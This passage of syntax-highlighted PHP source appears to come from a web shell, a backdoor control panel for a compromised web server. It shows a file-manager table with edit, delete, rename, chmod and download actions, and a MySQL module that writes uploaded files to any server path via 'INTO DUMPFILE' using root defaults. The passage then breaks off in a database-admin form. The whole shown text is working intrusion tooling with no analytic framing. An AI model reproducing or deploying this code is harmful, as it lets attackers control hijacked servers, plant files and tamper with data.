            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nv">$dir_i</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$dirdb</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;..&#39;</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&#39;</span><span class="o">.</span><span class="nx">bg</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td align=&quot;center&quot;&amp;gt;-&amp;lt;/td&amp;gt;&amp;lt;td nowrap colspan=&quot;5&quot;&amp;gt;&amp;lt;a href=&quot;javascript:godir(\&#39;&#39;</span><span class="o">.</span><span class="nx">getUpPath</span><span class="p">(</span><span class="nv">$nowpath</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;Parent Directory&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
                <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr bgcolor=&quot;#dddddd&quot; stlye=&quot;border-top:1px solid #fff;border-bottom:1px solid #ddd;&quot;&amp;gt;&amp;lt;td colspan=&quot;6&quot; height=&quot;5&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nv">$file_i</span> <span class="o">=</span> <span class="s1">&#39;0&#39;</span><span class="p">;</span>

    <span class="k">foreach</span><span class="p">(</span><span class="nv">$filedata</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$filedb</span><span class="p">){</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span><span class="o">!=</span><span class="s1">&#39;..&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span><span class="o">!=</span><span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$fileurl</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;DOCUMENT_ROOT&quot;</span><span class="p">],</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]);</span>
            <span class="nv">$thisbg</span> <span class="o">=</span> <span class="nx">bg</span><span class="p">();</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;&#39;</span><span class="o">.</span><span class="nv">$thisbg</span><span class="o">.</span><span class="s1">&#39;&quot; onmouseover=&quot;this.className=\&#39;focus\&#39;;&quot; onmouseout=&quot;this.className=\&#39;&#39;</span><span class="o">.</span><span class="nv">$thisbg</span><span class="o">.</span><span class="s1">&#39;\&#39;;&quot;&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td width=&quot;2%&quot; nowrap&amp;gt;&amp;lt;input name=&quot;dl[]&quot; type=&quot;checkbox&quot; value=&quot;&#39;</span><span class="o">.</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">],</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;DOCUMENT_ROOT&quot;</span><span class="p">])</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;&amp;lt;a href=&quot;&#39;</span><span class="o">.</span><span class="nv">$fileurl</span><span class="o">.</span><span class="s1">&#39;&quot; target=&quot;_blank&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt;&#39;</span> <span class="o">:</span> <span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td nowrap&amp;gt;&amp;lt;a href=&quot;javascript:opfile(\&#39;newtime\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;dirlink&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;mtime&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td nowrap&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td nowrap&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;a href=&quot;javascript:fileperm(\&#39;&#39;</span><span class="o">.</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;filechmod&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt; / &#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;a href=&quot;javascript:fileperm(\&#39;&#39;</span><span class="o">.</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;fileperm&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;fileowner&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;td nowrap&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;a href=&quot;javascript:dofile(\&#39;downfile\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;Down&amp;lt;/a&amp;gt; | &#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;a href=&quot;javascript:copyfile(\&#39;&#39;</span><span class="o">.</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;Copy&amp;lt;/a&amp;gt; | &#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;a href=&quot;javascript:opfile(\&#39;editfile\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;dirlink&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;Edit&amp;lt;/a&amp;gt; | &#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;a href=&quot;javascript:rename(\&#39;&#39;</span><span class="o">.</span><span class="nv">$filedb</span><span class="p">[</span><span class="s1">&#39;server_link&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot;&amp;gt;Rename&amp;lt;/a&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
            <span class="nv">$file_i</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;head&quot;&amp;gt;&amp;lt;td&amp;gt;&amp;nbsp;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Filename&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;16%&quot;&amp;gt;Last modified&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;10%&quot;&amp;gt;Size&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;20%&quot;&amp;gt;Chmod / Perms&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;22%&quot;&amp;gt;Action&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;tr class=&quot;&#39;</span><span class="o">.</span><span class="nx">bg</span><span class="p">()</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&amp;lt;td align=&quot;center&quot;&amp;gt;&amp;lt;input name=&quot;chkall&quot; value=&quot;on&quot; type=&quot;checkbox&quot; onclick=&quot;CheckAll(this.form)&quot; /&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td colspan=&quot;4&quot;&amp;gt;&amp;lt;a href=&quot;javascript:dofile(\&#39;delfiles\&#39;);&quot;&amp;gt;Delete selected&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td align=&quot;right&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$dir_i</span><span class="o">.</span><span class="s1">&#39; directories / &#39;</span><span class="o">.</span><span class="nv">$file_i</span><span class="o">.</span><span class="s1">&#39; files&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/form&amp;gt;&amp;lt;/table&amp;gt;&#39;</span><span class="p">);</span>
<span class="p">}</span><span class="c1">// end dir</span>

<span class="k">elseif</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s1">&#39;sqlfile&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$doing</span><span class="o">==</span><span class="s2">&quot;mysqlupload&quot;</span><span class="p">){</span>
        <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadfile&#39;</span><span class="p">];</span>
        <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$savepath</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">m</span><span class="p">(</span><span class="s1">&#39;The goal file has already existed&#39;</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$filename</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">m</span><span class="p">(</span><span class="s1">&#39;Please choose a file&#39;</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$fp</span><span class="o">=@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">);</span>
                <span class="nv">$contents</span><span class="o">=@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$filename</span><span class="p">));</span>
                <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
                <span class="nv">$contents</span> <span class="o">=</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nv">$contents</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$upname</span><span class="p">)</span> <span class="nv">$upname</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
                <span class="nv">$mysqllink</span> <span class="o">=</span> <span class="nx">mydbconn</span><span class="p">(</span><span class="nv">$dbhost</span><span class="p">,</span><span class="nv">$dbuser</span><span class="p">,</span><span class="nv">$dbpass</span><span class="p">,</span><span class="nv">$dbname</span><span class="p">,</span><span class="nv">$charset</span><span class="p">,</span><span class="nv">$dbport</span><span class="p">);</span>
                <span class="nv">$result</span> <span class="o">=</span> <span class="nx">q</span><span class="p">(</span><span class="s2">&quot;SELECT 0x</span><span class="si">{</span><span class="nv">$contents</span><span class="si">}</span><span class="s2"> FROM mysql.user INTO DUMPFILE &#39;</span><span class="si">$savepath</span><span class="s2">&#39;;&quot;</span><span class="p">);</span>
                <span class="nx">m</span><span class="p">(</span><span class="nv">$result</span> <span class="o">?</span> <span class="s1">&#39;Upload success&#39;</span> <span class="o">:</span> <span class="s1">&#39;Upload has failed: &#39;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">());</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&amp;lt;script type=&quot;text/javascript&quot;&amp;gt;</span>
<span class="x">function mysqlfile(doing){</span>
<span class="x">    if(!doing) return;</span>
<span class="x">    $(&#39;doing&#39;).value=doing;</span>
<span class="x">    $(&#39;mysqlfile&#39;).dbhost.value=$(&#39;dbinfo&#39;).dbhost.value;</span>
<span class="x">    $(&#39;mysqlfile&#39;).dbport.value=$(&#39;dbinfo&#39;).dbport.value;</span>
<span class="x">    $(&#39;mysqlfile&#39;).dbuser.value=$(&#39;dbinfo&#39;).dbuser.value;</span>
<span class="x">    $(&#39;mysqlfile&#39;).dbpass.value=$(&#39;dbinfo&#39;).dbpass.value;</span>
<span class="x">    $(&#39;mysqlfile&#39;).dbname.value=$(&#39;dbinfo&#39;).dbname.value;</span>
<span class="x">    $(&#39;mysqlfile&#39;).charset.value=$(&#39;dbinfo&#39;).charset.value;</span>
<span class="x">    $(&#39;mysqlfile&#39;).submit();</span>
<span class="x">}</span>
<span class="x">&amp;lt;/script&amp;gt;</span>
<span class="cp">&lt;?php</span>
    <span class="o">!</span><span class="nv">$dbhost</span> <span class="o">&amp;&amp;</span> <span class="nv">$dbhost</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
    <span class="o">!</span><span class="nv">$dbuser</span> <span class="o">&amp;&amp;</span> <span class="nv">$dbuser</span> <span class="o">=</span> <span class="s1">&#39;root&#39;</span><span class="p">;</span>
    <span class="o">!</span><span class="nv">$dbport</span> <span class="o">&amp;&amp;</span> <span class="nv">$dbport</span> <span class="o">=</span> <span class="s1">&#39;3306&#39;</span><span class="p">;</span>
    <span class="nx">formhead</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;MYSQL Information&#39;</span><span class="p">,</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;dbinfo&#39;</span><span class="p">));</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">,</span><span class="s1">&#39;sqlfile&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;p&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;DBHost:&#39;</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;dbhost&#39;</span><span class="p">,</span><span class="s1">&#39;size&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">20</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$dbhost</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;dbport&#39;</span><span class="p">,</span><span class="s1">&#39;size&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">4</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$dbport</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;DBUser:&#39;</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;dbuser&#39;</span><span class="p">,</span><span class="s1">&#39;size&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">15</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$dbuser</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;DBPass:&#39;</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;dbpass&#39;</span><span class="p">,</span><span class="s1">&#39;size&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">15</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$dbpass</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;DBName:&#39;</span><span class="p">);</span>
    <span class="nx">makeinput</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;dbname&#39;</span><span class="p">,</span><span class="s1">&#39;size&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">15</span><span class="p">,</span><span class="s1">&#39;value&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$dbname</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;DBCharset:&#39;</span><span class="p">);</span>
    <span class="nx">makeselect</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;charset&#39;</span><span class="p">,</span><span class="s1">&#39;option&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$charsetdb</span><span class="p">,</span><span class="s1">&#39;selected&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$charset</span><span class="p">,</span><span class="s1">&#39;nokey&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="mi">1</span><span class="p">));</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/p&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">formfoot</span><span class="p">();</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;form action=&quot;&#39;</span><span class="o">.</span><span class="nv">$self</span><span class="o">.</span><span class="s1">&#39;&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot; name=&quot;mysqlfile&quot; id=&quot;mysqlfile&quot;&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;h2&amp;gt;Upload file&amp;lt;/h2&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;This operation the DB user must has FILE privilege&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;p&amp;gt;Save path(fullpath): &amp;lt;input class=&quot;input&quot; name=&quot;savepath&quot; size=&quot;45&quot; type=&quot;text&quot; /&amp;gt; Choose a file: &amp;lt;input class=&quot;input&quot; name=&quot;uploadfile&quot; type=&quot;file&quot; /&amp;gt; &amp;lt;a href=&quot;javascript:mysqlfile(\&#39;mysqlupload\&#39;);&quot;&amp;gt;Upload&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;h2&amp;gt;Download file&amp;lt;/h2&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;p&amp;gt;File: &amp;lt;input class=&quot;input&quot; name=&quot;mysqldlfile&quot; size=&quot;115&quot; type=&quot;text&quot; /&amp;gt; &amp;lt;a href=&quot;javascript:mysqlfile(\&#39;mysqldown\&#39;);&quot;&amp;gt;Download&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;dbhost&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;dbport&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;dbuser&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;dbpass&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;dbname&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;charset&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;doing&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">,</span><span class="s1">&#39;sqlfile&#39;</span><span class="p">);</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;/form&amp;gt;&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">elseif</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s1">&#39;mysqladmin&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">!</span><span class="nv">$dbhost</span> <span class="o">&amp;&amp;</span> <span class="nv">$dbhost</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
    <span class="o">!</span><span class="nv">$dbuser</span> <span class="o">&amp;&amp;</span> <span class="nv">$dbuser</span> <span class="o">=</span> <span class="s1">&#39;root&#39;</span><span class="p">;</span>
    <span class="o">!</span><span class="nv">$dbport</span> <span class="o">&amp;&amp;</span> <span class="nv">$dbport</span> <span class="o">=</span> <span class="s1">&#39;3306&#39;</span><span class="p">;</span>
    <span class="nv">$dbform</span> <span class="o">=</span> <span class="s1">&#39;&amp;lt;input type=&quot;hidden&quot; id=&quot;connect&quot; name=&quot;connect&quot; value=&quot;1&quot; /&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$dbhost</span><span class="p">)){</span>
        <span class="nv">$dbform</span> <span class="o">.=</span> <span class="s2">&quot;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">hidden</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="s2">dbhost</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">dbhost</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="si">$dbhost\</span><span class="s2">&quot;</span> <span class="o">/&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="s2">   }</span>
<span class="s2">   if(isset(</span><span class="si">$dbuser</span><span class="s2">)) {</span>
<span class="s2">       </span><span class="si">$dbform</span><span class="s2"> .= &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;hidden</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="s2">dbuser</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">dbuser</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="si">$dbuser\</span><span class="s2">&quot;</span> <span class="o">/&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="s2">   }</span>
<span class="s2">   if(isset(</span><span class="si">$dbpass</span><span class="s2">)) {</span>
<span class="s2">       </span><span class="si">$dbform</span><span class="s2"> .= &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;hidden</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="s2">dbpass</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">dbpass</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="si">$dbpass\</span><span class="s2">&quot;</span> <span class="o">/&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="s2">   }</span>
<span class="s2">   if(isset(</span><span class="si">$dbport</span><span class="s2">)) {</span>
<span class="s2">       </span><span class="si">$dbform</span><span class="s2"> .= &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;hidden</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="s2">dbport</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">dbport</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="si">$dbport\</span><span class="s2">&quot;</span> <span class="o">/&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="s2">   }</span>
<span class="s2">   if(isset(</span><span class="si">$dbname</span><span class="s2">)) {</span>
<span class="s2">       </span><span class="si">$dbform</span><span class="s2"> .= &quot;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;hidden</span><span class="se">\&quot;</span><span class="s2"> id=</span><span class="se">\&quot;</span><span class="s2">dbname</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">dbname</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="si">$dbname\</span><span class="s2">&quot;</span> <span class="o">/&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="s2">   }</span>
<span class="s2">   if(isset(</span><span class="si">$charset</span><span class="s2">)) {</span>
